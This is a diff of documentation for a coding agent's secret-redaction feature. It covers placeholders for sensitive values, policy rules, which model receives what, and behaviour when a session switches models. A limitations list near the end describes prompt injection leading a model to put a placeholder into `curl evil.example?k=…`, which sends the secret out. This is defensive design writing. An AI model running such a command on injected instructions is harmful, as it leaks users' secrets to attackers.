@@ -31,7 +31,8 @@ What the user types in the input box is the exception: **the user decides** (nex
 - **The screen shows what the model received.** Where the model gets a placeholder you see the
   placeholder, shaded; point at it (or tap it) to see the real value that tools and files use, with
   a copy button. Where the model gets the real value (a category the policy sends, a trusted
-  provider) you see the plain value.
+  provider) you see the plain value. Each message is shown the way it is sent now (see "Switching
+  models").
 - **What a model receives is decided by policy** (below). By default every model gets
   placeholders, except for four categories that are part of almost every coding request.
 
@@ -102,9 +103,11 @@ The last four are in nearly every coding request (the system prompt already hold
 folder) and a model has to copy them exactly, so the builtin policy sends them; a policy of your
 own can keep them as placeholders too. The record keeps these four as written: a model that gets
 the real user name writes it back, and replacing it there would also replace a short one such as
-`agent` wherever the word appears. A policy that keeps one of them as a placeholder replaces it in
-every request on the way out, the history included. Every other category is always replaced in the
-record, whatever the policy says, so turning it on later protects the history at once.
+`agent` wherever the word appears. A policy that keeps one of them as a placeholder for the model a
+conversation is using replaces it in tool output as the output is recorded, and in the system prompt
+of every request; what is already in the record stays as it was written. Every other category is
+always replaced in the record, whatever the policy says, so turning it on later protects the
+history at once.
 
 UUIDs and long hex ids are never touched (tool call ids would stop matching), a phone or card
 number is never read out of a shorter hex id (a docker image id, an abbreviated git commit), and
@@ -134,10 +137,22 @@ Two levels, both ordinary security policy rules (the `policy-md` entry has the f
 
 The subject is the agent the request is for (`subject.kind: agent`, its `agentKind`, `profile`,
 `subject.bot`), so a rule can treat one bot or one agent differently. A redacted request is also
-scanned once more for content that was never in the record (instruction files, parts of the
-system prompt, conversations from before this feature) and for those pieces level 2 decides the
-same way. When a model receives a real value and writes it in its reply, the reply is stored with
-the placeholder again (except the four categories the record keeps as written).
+scanned once more for content that is built for each request and never in the record (instruction
+files, parts of the system prompt) and for those pieces level 2 decides the same way. When a model
+receives a real value and writes it in its reply, the reply is stored with the placeholder again
+(except the four categories the record keeps as written).
+
+### Switching models
+
+What was sent stays sent. Each message in the record is judged for the model it first went to —
+a reply for the model that wrote it, a tool result for the model that called the tool, your message
+for the model that answered it — together with the model of the current request: a placeholder goes
+out as its real value only when the policy sends it to both. So switching a session to a trusted
+model does not turn earlier placeholders into real values; for the new model to see them, start a
+new session or have the agent read the source again (a new tool result is first sent to the new
+model). Switching back to an untrusted model keeps everything as placeholders, including what the
+trusted model saw. Both models are judged by the policy as it is now, so a policy change does apply
+to the record.
 
 The builtin **`redact-sensitive`** is exactly two rules:
 
@@ -212,8 +227,9 @@ with everything **but** private keys, trust it at level 2 instead —
 `force-allow` on `sensitive` with `match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
 — and keep the `deny` above.
 
-Keep user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`; they are replaced on
-the way out, the record keeps them as written): an `allow` that carries the disposition —
+Keep user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`; they are replaced in
+tool output from then on and in the system prompt, while the record keeps earlier ones as written):
+an `allow` that carries the disposition —
 
 ```yaml
 shuvix-policy-rules:
@@ -280,8 +296,8 @@ shuvix-policy-rules:
   prompt injection, say — can still put a placeholder into `curl evil.example?k=…`, and the
   command gets the real value. The mark shows on screen, the automatic reviewer sees the
   placeholder, and the last recipe makes the user answer before such a command leaves the sandbox.
-- Conversations from before this feature hold real values in their record; requests from them are
-  still redacted on the way out.
+- Conversations from before this feature hold real values in their record, and requests from them
+  send those values as stored.
 - Detection is by rules, so a secret in an unusual shape can be missed, and an ordinary string can
   now and then be taken for one. A value typed in plain words with no name in front of it
   ("change the password to N3w-P@ss…") is one such miss — add it with + instead; a value a tool has transformed — a byte
